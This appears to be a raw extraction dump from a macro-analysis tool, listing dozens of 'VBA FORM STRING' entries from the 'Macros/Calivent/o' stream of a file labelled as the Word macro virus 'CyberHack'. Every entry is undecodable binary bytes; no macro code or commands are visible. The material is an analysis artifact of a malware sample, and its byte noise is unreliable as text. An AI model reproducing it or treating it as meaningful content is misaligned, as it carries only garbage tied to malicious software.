- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1��s����������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!��s��������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�Z1�kB�kB�kB�kB�kB�s9�kB�s9�s9�s9�s9�s9�kB�s9�s9�s9�kB�kB�s9�s9�kB�kB�kB�kB�Z1J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�����������������������������������������������������������ε��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�sJ��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��ZcZ9!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZ��{����Ɯ�Υ�Υ�Υ�֭�֭�֭�޵�޵������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�kB�Z1�kB�kB�kB�kB�ޔ��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�΄����������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!{J!��s��������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ބ1�9�9�c))!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R)�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�s9�s9�s9�kB�s9�kB�kBcR1)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�����������������������������������������������������������޵��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�sJJB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RJB�{Z����֭�֭�֭�޵�޵������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�����������������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{R�{R�{J�{R�{R�{R�{R�{R�{R�ޔ����������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{J!sJ!{J!��s��������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c)ބ1ބ1�{1�k)�c)sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!sJ!Z9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!sJ!�Z1�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�Z1sJ!J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�����������������������������������������������������������ε��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{RscB11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999cZB�sZ��{��k��{��{��{��{��{�������ƜƵ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�����������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�������������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!{J!{J!��s��������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!�R!�c)�c)�9��k���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!Z9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�����������������������������������������������������������ε��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!ZJ1kZ9�sJ�{R�sJscBcZ9J9!91!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{Z�{Z�{Z�{Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�����������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�������������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!{J!��s��������R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�s1��������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZ�����������������������������������������������������������Ƶ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c�����������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��k��k��k��k��k��k�������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!{J!sJ!��s��������R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�s1��������s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!�R!�R!�R!�R!�R!��9cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZ����޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�֭�޵�֭�֭�֭���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{Z�{Z�{Z�{Z��Z�{Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�����������������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1��c��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������������΄9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!��s��������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�s1��������k)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!�R!�R!�{1��k����k)J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k)��k9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{kJ�Υ�Μ�Μ�Μ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!�sJ�sJ�sJ�sJ�{J�sJ�{J�sJ�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�����������������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R������������{1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!{J!��s��������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�s1��������k)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!��Z�������9{J!{J!{J!{J!sJ!sJ!sJ!sJ!sJ!�{1�����s9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJƵ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��{��{��{��{��{��{��{��{��c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�����������������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�Z1�Z1�Z1�Z1�Z1�kB�kB�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�ք����������{1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�s1��������c9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!��Z�������9{J!{J!�R!�R!�R!�R!�R!�R!�R!�9�����s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJ��k��c��c��c��c��c��c��Z��c��c��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�ބ��������������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1��k����������{1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!�R)�R)�R)�{1��������9J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R)�R)�R)�R)��k�������9�R)�R)�R)�R)�R)�R)�R)�R)�R)�J����R!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJ��c��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R�kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{R)sJ!sJ!{R){R)sJ!{R)��s��������������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)��c����������{1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1ΌJ����Z)J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1����������9�Z1�Z1�Z1�Z1�Z1��k��Z�9J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB��c��R��R�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�Z1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��s��������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)��c����������k)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�kB�kB�kB�kB�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB����������J�kB�kB�kB�kB�{J��������9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB��R�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J{cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��k��������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{R)sJ!{R){R){R){R){R){R){R)��R����������k)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kZ9��Z��Z��Z��Z�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��Z��Z��Z��Z��Z��c��Z��Z��c��Z��Z��Z�����������c��c��c��c��c��c����JZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kR9��R�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J{cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��R����������k)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJ��s��s��k��k�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{��{��{��{��{��{��{��{ƭ{ƭ{ƭ{ƭ{ƭ{�����������kƭ{ƭ{ƭ{ƭ{ƭ{ֽ���k��k��k���������!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9��R�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{JsZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J����������k!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{kJƭ{ƭ{ƭ{Ƶ������������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�����������΄ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ���������s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�{J�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�Z1
-------------------------------------------------------------------------------
